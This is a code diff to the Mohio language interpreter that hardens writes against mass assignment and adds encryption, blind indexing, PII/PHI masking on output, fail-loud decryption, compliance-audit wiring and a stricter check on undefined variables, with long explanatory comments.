+        {"email": "...", "is_admin": "true"}: `is_admin` became a permanent column holding
+        "true". The shape said what a Member is; the write took whatever arrived.
+
+        SCOPED TO A WHOLE-OBJECT WRITE, which is what keeps it additive. `save to db.x` with
+        fields the developer typed out is their own list, and the corpus is full of writes to
+        tables no shape governs. The attack is specifically "write this request object", and
+        that is the only form refused here.
+        """
+        if not allowed or not isinstance(fields, dict):
+            return
+        # `id` is the row identity the database owns, not a user field.
+        extra = sorted(str(k) for k in fields if str(k) not in allowed and str(k) != 'id')
+        if not extra:
+            return
+        raise _Raise(
+            error_name='undeclared_field',
+            message=(f"`{verb}` carries field(s) `{'`, `'.join(extra)}` that shape "
+                     f"`{shape_name}` does not declare. A whole-object write may only carry "
+                     f"what its shape describes."),
+            line=getattr(node, 'line', None),
+            hint=(f"`{shape_name}` declares: {', '.join(sorted(allowed))}. Add the field to the "
+                  f"shape if it belongs there, or write the fields out one at a time if this "
+                  f"write deliberately carries something the shape does not describe."))
+
+    def _guard_write(self, table, fields, node=None, verb='write',
+                     allowed=None, shape_name=None):
+        """THE write chokepoint. Every write verb passes its fields through exactly this.
+
+        It exists because the alternative was already visible: `never store` and encryption were
+        each wired into seven call sites by hand, and every one of those seven had to be found
+        and edited again the day encryption was added to `update`, then again for `modify`, then
+        again for `flow` -- each time after a field had already gone to disk in the clear on the
+        verb nobody remembered. A hand-listed family regrows one member at a time. With one
+        hook, the next write-time rule is added once and every verb has it.
+        """
+        # THE BOUNDARY STRIP, and it is deliberately here as well as at the binding. A write path
+        # that bypasses the shape binding entirely must still never create a plumbing column: the
+        # damage this prevents is a PERMANENT schema change that no `drop` in the language can
+        # undo, made by a request the developer never inspected. Defence in depth is warranted
+        # exactly where the failure is irreversible.
+        if isinstance(fields, dict):
+            _stripped = self._strip_plumbing(fields)
+            if len(_stripped) != len(fields):
+                fields = _stripped
+        self._refuse_undeclared_shaped_fields(allowed, shape_name, fields, node, verb)
+        self._refuse_never_store(fields, node, verb, table)
+        self._enforce_shaped_write(table, fields, node, verb)
+        # THE TABLE TRAVELS WITH THE WRITE. This is the one call site, and it already knew
+        # which table it was writing to; not passing it was the whole reason a per-field rule
+        # had to be looked up by bare name and could borrow another table's classification.
+        return self._encrypt_fields_for_write(fields, node, table)
+
+    def _encrypt_fields_for_write(self, fields, node=None, table=None):
         """Encrypt any registered field in a save/update dict. Fails loud if a field
         needs encryption but no key is configured -- never silently store plaintext."""
-        if not self._encrypted_fields:
+        # THE VALUE CAN ASK FOR THIS TOO, so the early return has to let a classified value
+        # through even when the program declares no encrypted column at all.
+        _carried = [k for k in fields if value_class_of(fields[k]) in _WRITE_SEALED_CLASSES]
+        if not self.classification.any_field_has('encrypted') and not _carried:
             return fields
-        to_enc = [k for k in fields if k in self._encrypted_fields and fields[k] is not None]
+        # RESOLVED BY IDENTITY. With a table, `vendors.email` and `customers.email` are two
+        # different fields and only the tagged one is encrypted. Without a table the resolver
+        # answers the union, which is exactly what the bare-name set answered, so a caller that
+        # cannot say which table it writes to is never left with LESS protection than before.
+        #
+        # OR THE VALUE SAYS SO. The column tag answers "what is this column for"; it cannot
+        # answer "what is this particular value". A [phi] value copied into a variable and
+        # saved to a column nobody tagged used to land in plaintext on disk, measured by
+        # reading the file directly, while the same value in its own column was sealed. The
+        # protection belonged to the value and was being decided by its destination.
+        #
+        # ENCRYPTION STAYS HERE, at the write, and that is what keeps the blind index whole:
+        # the plaintext is still present at this seam, so the HMAC below is taken over the
+        # value itself exactly as before and the row stays findable and erasable. Moving
+        # encryption earlier, to the read, would have removed the plaintext from this point and
+        # left nothing to index.
+        to_enc = [k for k in fields
+                  if fields[k] is not None
+                  and (self.classification.has(k, 'encrypted', table)
+                       or value_class_of(fields[k]) in _WRITE_SEALED_CLASSES)]
         if not to_enc:
             return fields
         key = self._encryption_key()
@@ -4012,33 +6251,177 @@ class MohioInterpreter:
                          f"encryption key is set -- refusing to store them as plaintext."),
                 line=getattr(node, 'line', None),
                 hint="Set MOHIO_ENCRYPTION_KEY in the environment (a strong secret).")
-        return {k: (self._encrypt_field(v, key) if k in self._encrypted_fields else v)
-                for k, v in fields.items()}
+        _enc = set(to_enc)
+        out = {k: (self._encrypt_field(v, key) if k in _enc else v)
+               for k, v in fields.items()}
+        # BLIND INDEX, written at the SAME seam as the encryption itself. Every write verb
+        # already calls this one function, so every write verb indexes -- save, update,
+        # upsert, save all, modify and flow cannot drift apart, which is exactly how the
+        # encryption gap opened in the first place (modify and flow silently skipped it).
+        # The HMAC is taken over the PLAINTEXT, before it is encrypted.
+        for k in to_enc:
+            out[self._bidx_col(k)] = self._bidx_of(fields[k])
+        return out
+
+    def _row_has_ciphertext(self, row):
+        """Does any value in this row carry the encryption marker?
+
+        Asked so a row can be decrypted on the strength of its own contents when no column in
+        the reading program is declared encrypted at all. A program that never declares a tag
+        can still be handed a classified value that travelled into one of its columns, and
+        returning `enc:v1:...` to it is the failure this guards.
+        """
+        return any(isinstance(v, str) and v.startswith(self._ENC_PREFIX)
+                   for v in row.values())
 
     def _decrypt_row(self, row):
-        """Decrypt registered fields in a fetched row (dict)."""
-        if not self._encrypted_fields or not isinstance(row, dict):
+        """Decrypt registered fields in a fetched row (dict), and hide the search index.
+
+        The `<field>__bidx` shadow columns are the runtime's own machinery for making an
+        encrypted field matchable. They are NOT program data: a whole-row `show`, an export,
+        or any other row-shaped output was handing back the HMACs alongside the value, which
+        is a security leak rather than a cosmetic one -- publishing the index lets anyone
+        holding the output correlate which rows share a value, which is exactly the property
+        the blind index is supposed to confine to the database. Regression introduced with the
+        blind index itself (T0-9); stripped here, at the one seam every read passes through.
+
+        Stripped BEFORE the no-tagged-fields early return on purpose: a table can carry shadow
+        columns written by an earlier run whose shape declared the tag, while the program doing
+        the reading declares none. The columns still must not surface.
+        """
+        if isinstance(row, dict):
+            for _k in [k for k in row if str(k).endswith(self._BIDX_SUFFIX)]:
+                row.pop(_k, None)
+        if not isinstance(row, dict):
+            return row
+        # THE CIPHERTEXT SELF-DESCRIBES, so decryptability is a property of the VALUE, never of
+        # the column it happens to be sitting in. `_decrypt_field` has always keyed on the
+        # `enc:v1:` marker; this row-level walk did not, and gated on the column's tag instead,
+        # so the two disagreed about the same value. Measured through `mio run`, with a real
+        # ciphertext planted in an untagged column:
+        #
+        #     show ("body is: " & n.body)   ->   body is: enc:v1:vWx3JOW5/HIJSVcaFoxMgSBv...
+        #
+        # Handing back ciphertext as though it were the value is the exact outcome the fail-loud
+        # below exists to prevent, and the column gate walked straight past it. A value that
+        # carries the marker is decrypted wherever it is found.
+        if not (self.classification.any_field_has('encrypted') or self._row_has_ciphertext(row)):
             return row
         key = self._encryption_key()
-        if key is None:
-            return row
+        # Returning CIPHERTEXT as though it were the value is the one outcome this path must
+        # never produce. The write half already refuses loudly rather than store plaintext
+        # ("refusing to store them as plaintext"); the read half used to shrug -- a rotated or
+        # wrong MOHIO_ENCRYPTION_KEY silently handed back `enc:v1:...` and the program showed
+        # it, compared it, or SAVED IT AGAIN, double-encrypting the field beyond recovery.
+        # A value with no `enc:` prefix is genuinely plaintext (written before encryption was
+        # enabled) and still passes through untouched -- only a field that IS still ciphertext
+        # after the attempt is an error.
+        def _still_ciphertext(v):
+            return isinstance(v, str) and v.startswith(self._ENC_PREFIX)
+
         for k in list(row.keys()):
-            if k in self._encrypted_fields:
+            # EITHER the column is declared encrypted, OR the value says it is. The first keeps
+            # the fail-loud on a tagged column whose value came back plaintext-looking; the
+            # second is what makes a classified value readable after it travels into a column
+            # nobody tagged.
+            if self.classification.has(k, 'encrypted') or _still_ciphertext(row[k]):
+                if key is None:
+                    if _still_ciphertext(row[k]):
+                        raise _Raise(error_name='encryption.key_missing',
+                            message=(f"field '{k}' is stored encrypted but no encryption key is "
+                                     f"set, so it cannot be read back. Refusing to hand back the "
+                                     f"ciphertext as if it were the value."),
+                            hint="Set MOHIO_ENCRYPTION_KEY to the key this data was written with.")
+                    continue
                 try:
-                    row[k] = self._decrypt_field(row[k], key)
-                except Exception:
-                    pass   # leave as-is if it can't be decrypted
+                    _plain = self._decrypt_field(row[k], key)
+                    # IT CAME OUT OF CIPHERTEXT, and that is a fact about the value, not a guess
+                    # about its meaning. Without carrying it, reading a sealed value back out of
+                    # an untagged column and saving it again wrote PLAINTEXT: the write had
+                    # nothing to key on, because the column it came from declares nothing and
+                    # the class had nowhere to live. Measured before this:
+                    #
+                    #     {'body': '111-11-1111', 'who': 'Bob', 'body__bidx': None}
+                    #
+                    # 'encrypted' is deliberately not 'phi' or 'pci'. The marker does not record
+                    # WHICH classification sealed the value and inventing one would be a guess.
+                    # It says only what is known: this was stored encrypted, so store it that
+                    # way again. Masking still keys on the declared classes alone, so this
+                    # changes what is written and nothing about what is shown.
+                    row[k] = (ClassifiedText(_plain, 'encrypted')
+                              if isinstance(_plain, str) and isinstance(row[k], str)
+                              and row[k].startswith(self._ENC_PREFIX)
+                              else _plain)
+                except Exception as _e:
+                    raise _Raise(error_name='encryption.cannot_decrypt',
+                        message=(f"field '{k}' could not be decrypted with the current encryption "
+                                 f"key ({type(_e).__name__}). Refusing to hand back the ciphertext "
+                                 f"as if it were the value -- saving it again would double-encrypt "
+                                 f"it permanently."),
+                        hint="This usually means the key was rotated or replaced. Restore the key "
+                             "this data was written with, or re-encrypt the stored rows.") from _e
+                if _still_ciphertext(row[k]):
+                    raise _Raise(error_name='encryption.cannot_decrypt',
+                        message=(f"field '{k}' is still ciphertext after decryption, so the value "
+                                 f"cannot be read back."),
+                        hint="Check that MOHIO_ENCRYPTION_KEY matches the key this data was "
+                             "written with.")
         return row
 
     def _mask_last4(self, s):
         s = '' if s is None else str(s)
         return s if len(s) <= 4 else '****' + s[-4:]
 
+    def _egress_masked_fields(self):
+        """Field names that must not leave in plaintext. [pci] and [phi].
+
+        MEASURED over real HTTP before this existed. One shape, four fields, one POST:
+
+            "ssn":   "123-45-6789"      [phi] -> PLAINTEXT on the wire
+            "pan":   "****1111"         [pci] -> masked
+            "email": "ada@x.com"        [pii] -> PLAINTEXT on the wire
+
+        So the mask was real and wired, and `[phi]` simply was not consulted by it. Health data
+        drove AES-256-GCM at rest and then went out in the clear, which is the whole tag failing
+        at the only boundary that leaves the building.
+
+        `[pii]` is deliberately NOT here. It is the loosest of the three and its plaintext
+        egress is both legitimate and pervasive -- `examples/contact.mho`, the reference example,
+        serves the visitor their own email back on the confirmation page. Masking it would break
+        that and a great deal like it, and "safest" is not the same as "narrowest": this closes
+        the healthcare-blocking leak without a behaviour change nobody asked for. Reported.
+        """
+        # RECORDED AS A DECISION, not only as a comment: `mohio_decisions.DELIBERATE`
+        # ['pii_plaintext_egress']. The reasoning above has been re-filed as a defect three
+        # times, because a docstring is invisible to the pass that keeps re-filing it. The
+        # registry states the same thing where a program can read it.
+        return (set(self.classification.fields_with('pci'))
+                | set(self.classification.fields_with('phi')))
+
+    _VALUE_MASKED_CLASSES = ('pci', 'phi')
+
+    def _value_is_classified(self, mv):
+        """Does this VALUE carry a masked classification of its own?
+
+        THE GUARD WAS NAME-BOUND WHILE THE PROTECTION IS VALUE-BOUND, which is the same split
+        the derived-variable fix closed one layer down. Both masking paths open with "if no
+        field in this program is classified, there is nothing to mask" and return early. That
+        is true only while a classification can arrive one way: off a tagged field. It can also
+        arrive on the value itself -- `take ssn as text [phi]` classifies what comes IN, and
+        such a program may declare no tagged field at all. Measured over real HTTP before this:
+        the value carried `data_class = 'phi'` correctly and went out as 111-11-1111, because
+        the early exit fired before anything looked at it.
+
+        So the gate asks both questions now: is any NAME classified, or is THIS VALUE.
+        """
+        return getattr(mv, 'data_class', None) in self._VALUE_MASKED_CLASSES
+
     def _apply_pci_mask(self, raw):
+        _masked = self._egress_masked_fields()
         if isinstance(raw, dict):
             out = {}
             for k, v in raw.items():
-                if k in self._pci_fields and isinstance(v, str) and not v.startswith(self._ENC_PREFIX):
+                if k in _masked and isinstance(v, str) and not v.startswith(self._ENC_PREFIX):
                     out[k] = self._mask_last4(v)
                 else:
                     out[k] = self._apply_pci_mask(v)
@@ -4048,6 +6431,17 @@ class MohioInterpreter:
         return raw
 
     def _display_value(self, mv):
+        # An EMPTY value displays as Mohio's empty form, never Python's `None`. A cleared or
+        # never-filled variable used to surface the host language's internals straight into user
+        # output (`show note` after `clear note` printed `None`), which is both a leak of the
+        # implementation and a value no Mohio program could have produced. Empty string is the
+        # representation the language already uses everywhere else -- `"[" & note & "]"` renders
+        # `[]` -- so this makes display agree with concatenation rather than inventing a third
+        # spelling. `_giveback_masked` returns before reaching here when value is None, so a
+        # `give back` of an empty value is unaffected (T1-EMPTY-DISPLAY-NONE, 2026-08-23).
+        _raw = mv.to_python() if hasattr(mv, 'to_python') else mv
+        if _raw is None:
+            return ''
         cur = getattr(mv, '_currency', None) if isinstance(mv, MohioValue) else None
         if cur and self._is_currency(cur):
             return self._format_currency(mv.to_python(), cur)
@@ -4056,16 +6450,71 @@ class MohioInterpreter:
             _pv = mv.to_python()
             if isinstance(_pv, (int, float)) and not isinstance(_pv, bool):
                 return f"{float(_pv):.{_pad}f}"
-        if not self._pci_fields:
+        if not self._egress_masked_fields() and not self._value_is_classified(mv):
             return mv.to_python() if hasattr(mv, 'to_python') else mv
         raw = mv.to_python() if hasattr(mv, 'to_python') else mv
-        if getattr(mv, 'data_class', None) == 'pci' and isinstance(raw, str):
+        # NEVER MASK CIPHERTEXT. Masking an `enc:v1:` blob produces `****H3hy`, which is not a
+        # masked value, it is a destroyed one: the round trip cannot decrypt it back. The
+        # dict-walking mask already carried this guard; this scalar path did not, and it only
+        # surfaced once phi joined pci here, because a zone-tagged shape seals every field and
+        # then reads them back still encrypted.
+        if getattr(mv, 'data_class', None) in ('pci', 'phi') and isinstance(raw, str)                 and not raw.startswith(self._ENC_PREFIX):
+            # ONLY THE PART THAT CAME FROM A CLASSIFIED FIELD. A string built by joining
+            # `"the ssn is "` to a [phi] field used to come out as `****1111`: the whole result
+            # was masked, so protecting four characters destroyed the sentence around them. The
+            # spans recorded when the string was joined say which stretches came from a
+            # classified value, and only those are hidden.
+            _spans = getattr(mv, '_masked_spans', None)
+            if _spans:
+                out, cursor = [], 0
+                for _s, _e, _cls in sorted(_spans):
+                    if _s < cursor:          # overlapping spans cannot both be masked cleanly
+                        continue
+                    out.append(raw[cursor:_s])
+                    _piece = raw[_s:_e]
+                    # A piece still sealed is left alone, for the reason the whole-value guard
+                    # above exists: masking ciphertext destroys it rather than hiding it.
+                    out.append(_piece if _piece.startswith(self._ENC_PREFIX)
+                               else self._mask_last4(_piece))
+                    cursor = _e
+                out.append(raw[cursor:])
+                return "".join(out)
             return self._mask_last4(raw)
         return self._apply_pci_mask(raw)
 
-    def _giveback_masked(self, value):
-        if not self._pci_fields or value is None:
+    @staticmethod
+    def _egress_field_name(expr):
+        """The field name a give-back expression reads, or None when it is not a field read.
+
+        A SINGLE SCALAR HAS NO KEY, which is the whole reason the leak existed. The egress mask
+        decides by dict key, so `give back p` masks and `give back p.ssn` hands it a bare string
+        with nothing to match on. The name is right there in the expression the author wrote, so
+        it is taken from there.
+
+        DELIBERATELY DOES NOT UNWRAP A CAST. `p.ssn as.json` is masked inside the cast, before
+        the value becomes a JSON string, because that is the only point where the string is
+        still the value rather than its serialization. Unwrapping here as well masked it twice
+        and corrupted it: `****111"` -- the second pass counted the closing quote as a digit.
+        One masking point per path, chosen where the value is still itself.
+        """
+        parts = getattr(expr, 'parts', None)
+        return str(parts[-1]) if parts else None
+
+    def _giveback_masked(self, value, source_expr=None):
+        if value is None:
             return value
+        if not self._egress_masked_fields() and not self._value_is_classified(value):
+            return value
+        # THE SINGLE-FIELD SCALAR PATH, resolved by identity like every other control. Measured
+        # over real HTTP before this: `give back p.ssn` on a [phi] field returned 111-11-1111,
+        # while `give back p` on the same row masked it -- the false negative surviving on the
+        # narrowest path, which is the one a real handler uses when it answers with one value.
+        field = self._egress_field_name(source_expr) if source_expr is not None else None
+        if field is not None and field in self._egress_masked_fields():
+            raw = value.to_python() if isinstance(value, MohioValue) else value
+            if isinstance(raw, str) and not raw.startswith(self._ENC_PREFIX):
+                mt = value.mohio_type if isinstance(value, MohioValue) else 'any'
+                return MohioValue(self._mask_last4(raw), mt)
         masked = self._display_value(value)
         mt = value.mohio_type if isinstance(value, MohioValue) else 'any'
         return MohioValue(masked, mt)
@@ -4146,7 +6595,28 @@ class MohioInterpreter:
         if self.verbose: print(f"  [lock] {node.name}")
 
     def _exec_ComplianceDecl(self, node, ctx):
-        ctx._compliance.append(node.framework)
+        # P0-2 (2026-09-02, ruled): this used to append the framework NAME to `ctx._compliance`,
+        # while `_audit_requirement` reads `ctx._sector_compliance`. Two attributes that never
+        # met, so `required_grade` came back 'none' for EVERY `compliance:` declaration, the
+        # whole `if req_grade != 'none':` block was skipped, and the `audit.no_durable_store`
+        # refusal was unreachable. Verified before the fix: a `compliance: HIPAA` program with no
+        # database ran to completion and printed `[ai.audit] ->` as though a record were written,
+        # while writing nowhere. The framework list now goes where the grade machinery reads it.
+        #
+        # It ALSO fixes a type collision on the old attribute. `_compliance` is the compliance
+        # RECORD list elsewhere (dicts, consumed as `e.get('action')` in the erase-lock path), so
+        # appending a bare string into it made that consumer raise
+        # `AttributeError: 'str' object has no attribute 'get'` -- confirmed by running. One
+        # attribute was holding two different things.
+        #
+        # Read-then-write through scoped_attr so a `sector:` profile's own compliance list is
+        # EXTENDED rather than clobbered: a program may declare both, and `required_grade` takes
+        # the highest grade across the whole list, which is the composition rule already in
+        # place.
+        _fw = list(scoped_attr(ctx, '_sector_compliance') or [])
+        if node.framework not in _fw:
+            _fw.append(node.framework)
+        ctx._sector_compliance = _fw
         if self.verbose: print(f"  [compliance] {node.framework}")
 
     def _exec_SecurityDecl(self, node, ctx):
@@ -4357,7 +6827,7 @@ class MohioInterpreter:
         did (2026-08-04, same day, different bug)."""
         idle = _SESSION_IDLE_TIMEOUT_SECONDS
         absolute = _SESSION_ABSOLUTE_TIMEOUT_SECONDS
-        profile = getattr(ctx, '_sector_profile', None)
+        profile = scoped_attr(ctx, '_sector_profile')
         for rule in (getattr(profile, 'expire_rules', None) or []):
             secs = _duration_rule_to_seconds(rule.duration, rule.unit)
             if secs is None:
@@ -4771,7 +7241,7 @@ class MohioInterpreter:
         # tool call is caught by the agent loop and routed to its fallback. A grant
         # cannot widen past this ceiling -- the sector answers "is this permitted at
         # all," which no developer grant can override.
-        _sector = getattr(ctx, '_sector_profile', None)
+        _sector = scoped_attr(ctx, '_sector_profile')
         if _sector is not None and getattr(_sector, 'operation_rules', None):
             # If any rule governs by data classification (`any operation touching
             # [pci]`), inspect which classifications this call's payload touches.
@@ -4795,6 +7265,30 @@ class MohioInterpreter:
                     # meant to catch silently pass governance and reach the wire -- the sector
                     # ceiling exists precisely so nothing slips past it unverified. An
                     # unanswerable scan must BLOCK, never assume "nothing regulated here."
+                    # THE MAIN VERDICT PATH AUDITS AND THIS EARLIER GUARD DID NOT, so an
+                    # operation stopped by the sector ceiling left a record when the profile
+                    # could READ the payload and left none when it could not. The unverifiable
+                    # case is the one a reviewer most wants to see: something was refused
+                    # because governance could not be applied, which is a different and more
+                    # urgent fact than a rule matching.
+                    #
+                    # LOGGED WHERE THE RULES THAT FORCED THE SCAN SAY. No rule has matched yet,
+                    # so there is no verdict to take a log from; the scan exists only because
+                    # data-class rules are present, so their log is the honest destination, with
+                    # the same fallback the verdict path uses.
+                    _sf_log = next((r.get('audit_log') for r in _sector.operation_rules
+                                    if r.get('data_class') and r.get('audit_log')),
+                                   '') or 'operation_audit_log'
+                    _sf_evt = self._audit_event(_sf_log, {
+                        'event':     'OPERATION_REFUSED',
+                        'verdict':   'scan_failed',
+                        'connector': node.connector,
+                        'operation': node.operation,
+                        'sector':    getattr(_sector, 'name', ''),
+                        'reason':    (f"could not verify the payload against this profile's "
+                                      f"data-classification rules: {e}")[:300],
+                    }, ctx)
+                    self._audit_logs.setdefault(_sf_log, []).append(_sf_evt)
                     raise _Raise(
                         error_name='sector_scan_failed',
                         message=(f"{node.connector}.{node.operation}: could not verify this "
@@ -5079,7 +7573,7 @@ class MohioInterpreter:
     # ── Listen / Routing ──────────────────────────────────────
 
     def _exec_ListenBlock(self, node, ctx):
-        req = ctx._current_request
+        req = scoped_attr(ctx, '_current_request')
         if not req:
             if self.verbose: print("  [listen] no request — skipping")
             return None
@@ -5218,8 +7712,37 @@ class MohioInterpreter:
         else:
             exec_ctx = ctx.child()
 
+        # The request's id, bound in the handler's own scope. This is the routed path every
+        # served app uses; binding it only where the non-routed `request` shape is built left it
+        # invisible to every `listen for` / `request for` handler, which is most of them.
+        _rid = getattr(self, '_request_id', None)
+        if _rid:
+            exec_ctx.set('request_id', MohioValue(_rid, 'text'))
+
         shape_var = node.shape[0].lower() + node.shape[1:]
-        exec_ctx.set(shape_var, MohioValue(req, 'shape'))
+        # The shape variable carried the RAW request, envelope and all, while the loop right
+        # below it already knew to skip `_`-prefixed keys. So `give back member` served
+        # `_method`, `_path` and `__request_cookies__` straight to the client, and
+        # `save all to db.members from member` wrote them as columns. Same dict, two different
+        # rules, one line apart. The binding now follows the rule the loop always followed.
+        # WHAT THIS SHAPE ALLOWS, carried on the value itself rather than looked up again later.
+        # Without it a `save all to db.X from member` downstream holds a dict and no idea what
+        # was permitted to be in it, which is why an undeclared `is_admin` sailed through: the
+        # validator walks the fields the shape DECLARES and checks each one, and an EXTRA field
+        # is not a failed check, it is a check nobody ran. Two different questions, and only one
+        # was being asked.
+        _decl = exec_ctx.get_shape(node.shape)
+        _allowed = frozenset(str(getattr(f, 'name', '')) for f in (
+            _decl.every_field() if hasattr(_decl, 'every_field')
+            else (getattr(_decl, 'fields', None) or []))) if _decl is not None else None
+
+        def _bind_shape_value(data):
+            v = MohioValue(data, 'shape')
+            v.shape_name = node.shape
+            v.shape_fields = _allowed
+            exec_ctx.set(shape_var, v)
+
+        _bind_shape_value(self._strip_plumbing(req))
         for k, v in req.items():
             if not k.startswith('_'):
                 exec_ctx.set(k, MohioValue(v))
@@ -5288,7 +7811,7 @@ class MohioInterpreter:
                     _rqd[_fn] = _num
                     exec_ctx.set('request', MohioValue(_rqd, 'shape'))
             if not errors:
-                exec_ctx.set(shape_var, MohioValue(_data, 'shape'))
+                _bind_shape_value(_data)
             if errors:
                 # Signal the dispatcher to re-render with errors. It re-runs the
                 # GET view for this route when one exists (full page, chrome
@@ -5299,12 +7822,12 @@ class MohioInterpreter:
                         'path': node.path}
             # Validation passed: persist any uploaded files and rebind each field
             # to its stored path so the handler saves the path, not raw bytes.
-            stored = self._store_uploads(shape, _data)
+            stored = self._store_uploads(shape, _data, exec_ctx)
             for fn, path in stored.items():
                 _data[fn] = path
                 exec_ctx.set(fn, MohioValue(path))
             if stored:
-                exec_ctx.set(shape_var, MohioValue(_data, 'shape'))
+                _bind_shape_value(_data)
 
         try:
             result = self._exec_block(node.body, exec_ctx)
@@ -5370,6 +7893,12 @@ class MohioInterpreter:
     def _exec_request_listener(self, node, ctx, req):
         self._refuse_write_on_get(node.body, 'request for')
         child = ctx.child()
+        # The request's id, in the handler's own scope. `request for` is the route form a served
+        # app actually uses, and it dispatches through here rather than through
+        # _exec_new_listener -- binding it only there left it invisible to every GET handler.
+        _rid = getattr(self, '_request_id', None)
+        if _rid:
+            child.set('request_id', MohioValue(_rid, 'text'))
         shape_var = node.shape[0].lower() + node.shape[1:]
         child.set(shape_var, MohioValue(req, 'shape'))
         for k, v in req.items():
@@ -5517,11 +8046,11 @@ class MohioInterpreter:
         if data == 'wc_is':       return self._loose_eq(left, _rhs())
         if data == 'wc_not_is':   return not self._loose_eq(left, _rhs())
         if data == 'wc_is_name':  return self._loose_eq(left, _rhs())
-        if data == 'wc_contains': return str(_rhs() or '') in str(left or '')
+        if data == 'wc_contains': return _text_predicate('contains', left, _rhs())
         if data in ('wc_starts', 'wc_starts_with'):
-            return str(left or '').startswith(str(_rhs() or ''))
+            return _text_predicate('starts', left, _rhs())
         if data in ('wc_ends', 'wc_ends_with'):
-            return str(left or '').endswith(str(_rhs() or ''))
+            return _text_predicate('ends', left, _rhs())
         if data in ('wc_above', 'wc_below', 'wc_not_above', 'wc_not_below'):
             l, r = _num(left), _num(_rhs())
             if l is None or r is None:
@@ -5585,25 +8114,83 @@ class MohioInterpreter:
             return None
         return self._exec(node.stmt, ctx)
 
+    # Emptiness clause forms a `check` block can carry, gathered from the grammar rather
+    # than guessed: the `where_condition` subtrees (mohio.lark 2938-2941) and the two
+    # Condition ops the transformer emits for `is.empty` / `not.empty`.
+    _EMPTINESS_TREES = ('wc_empty', 'wc_not_empty', 'wc_is_empty', 'wc_is_not_empty')
+    _EMPTINESS_OPS   = ('is.empty', 'not.empty')
+
+    def _check_tests_existence(self, node):
+        """True when a `check` block declares it is testing EXISTENCE, not a value.
+
+        That is what licenses an undefined subject (T1-CHECK-UNDEFINED-SUBJECT). Any
+        emptiness clause anywhere in the block counts, in any of the spellings the grammar
+        allows -- bare `when empty`, the `wc_*` where-condition subtrees, or a Condition
+        carrying `is.empty`/`not.empty`. Compound and/or/not conditions are walked, so an
+        emptiness test nested inside one still counts.
+        """
+        def _walk(v):
+            if v is None:
+                return False
+            tn = type(v).__name__
+            if tn == 'Tree':
+                return str(getattr(v, 'data', '')) in self._EMPTINESS_TREES
+            if tn == 'Condition':
+                return str(getattr(v, 'op', '')) in self._EMPTINESS_OPS
+            if tn == 'NotCondition':
+                return _walk(getattr(v, 'condition', None))
+            if tn in ('AndCondition', 'OrCondition'):
+                return _walk(getattr(v, 'left', None)) or _walk(getattr(v, 'right', None))
+            if tn == 'DottedName':
+                # bare `when empty` -- the keyword form, only when no real variable shadows it
+                return list(getattr(v, 'parts', [])) == ['empty']
+            return False
+
+        for when in getattr(node, 'when_clauses', None) or []:
+            if _walk(getattr(when, 'value', None)):
+                return True
+            if str(getattr(when, 'condition', '')) in ('empty', 'notempty'):
+                return True
+        return False
+
     def _exec_CheckBlock(self, node, ctx):
         """
         Execute a check block. If the block has as_name (check: done as X),
         give back inside when/otherwise sets the block result rather than
         propagating up. The result is bound to as_name in context.
         """
-        # T1-EVAL-SIMPLE-FAILLOUD FORK 2 (2026-08-17): `check`'s SUBJECT is deliberately exempt
-        # from the never-declared fail-loud -- A3 already ruled an undefined subject takes the
-        # `when X is empty` branch rather than erroring, and `check` is fundamentally a
-        # look-and-test verb (`check x / when x is empty / ... / check: done` is the canonical
-        # form for "does this even exist"). Only the SUBJECT is exempt here; anything read inside
-        # a when/otherwise BODY still goes through the normal fail-loud path unchanged.
+        # T1-EVAL-SIMPLE-FAILLOUD FORK 2 (2026-08-17) exempted `check`'s SUBJECT from the
+        # never-declared fail-loud entirely, because A3 ruled that `check x / when x is empty`
+        # is the canonical "does this even exist" form and must keep working on an undefined x.
+        #
+        # T1-CHECK-UNDEFINED-SUBJECT (2026-08-27) NARROWS that exemption, because a blanket one
+        # is an auth-bypass: `is_admin true` + a typo'd `check is_adnim / when true / otherwise`
+        # silently took `otherwise` and denied an admin, with `mio check` reporting no errors --
+        # undefined was byte-identical to a genuinely-false value. `show is_adnim` already fails
+        # loud on the very same name, so this was an inconsistency, not a policy.
+        #
+        # The exemption now requires the block to SAY it is testing existence: any emptiness
+        # clause (`when empty`, `when x is empty`, `when x is not empty`, `is.empty`/`not.empty`)
+        # keeps the old behaviour. A block with no such clause is asking about a VALUE, so an
+        # undefined subject fails loud and names the variable. Only the SUBJECT is affected;
+        # anything read inside a when/otherwise BODY is unchanged.
         try:
             value = self._eval(node.value, ctx)
         except _Raise as _undecl:
-            if getattr(_undecl, 'error_name', None) == 'undeclared_variable':
+            if getattr(_undecl, 'error_name', None) != 'undeclared_variable':
+                raise
+            if self._check_tests_existence(node):
                 value = MohioValue(None)
             else:
-                raise
+                _sub = node.value
+                _nm = (_sub.parts[0] if type(_sub).__name__ == 'DottedName'
+                       and len(getattr(_sub, 'parts', [])) == 1 else None)
+                if _nm is None:
+                    raise
+                raise MohioRuntimeError(
+                    f"check refers to an unknown variable '{_nm}'. Declare it first "
+                    f"(e.g. `{_nm} <value>`), or check the spelling. To test whether it "
+                    f"exists instead, add a `when {_nm} is empty` branch.")
         raw   = value.to_python() if isinstance(value, MohioValue) else value
 
         # Verbose trace: show what is being checked
@@ -5749,6 +8336,12 @@ class MohioInterpreter:
         items = collection.to_python() if isinstance(collection, MohioValue) else collection
         if not items: return None
         if isinstance(items, dict): items = list(items.values())
+        # `take N` is a BOUND, not a requirement: taking more than exists walks what is there,
+        # because "up to N" is what a bound means. Slicing rather than counting keeps the loop
+        # body untouched.
+        _take = getattr(node, 'take_n', None)
+        if _take is not None:
+            items = list(items)[:max(0, int(_take))]
         result = None
         for item in items:
             self._check_deadline(node)
@@ -5870,16 +8463,35 @@ class MohioInterpreter:
 
     # ── MioQL — Data Operations ────────────────────────────────
 
+    # The word a coder actually TYPED, for a refusal message that names their line rather than an
+    # internal class name. A clause with no entry falls back to its type name, which is still far
+    # better than silence -- the point is that nothing is ever dropped without being named.
+    _CLAUSE_WORDS = {
+        'WhereClause': 'where', 'AndClause': 'and', 'OrClause': 'or',
+        'LimitClause': 'up to', 'OrderClause': 'order', 'SkipClause': 'skip',
+        'PaginateClause': 'paginate by', 'CacheClause': 'cache', 'ExportClause': 'export',
+        'ReturnClause': 'return', 'JoinBlock': 'join', 'SummarizeBlock': 'summarize',
+        'CalculateBlock': 'calculate', 'InjectClause': 'inject', 'SinceClause': 'since',
+        'TimespanRef': 'timespan',
+    }
+
+    def _clause_word(self, node):
+        return self._CLAUSE_WORDS.get(type(node).__name__, type(node).__name__)
+
     def _exec_RetrieveBlock(self, node, ctx):
         held_list = self._resolve_held_list_source(node.source, ctx)
         if held_list is None:
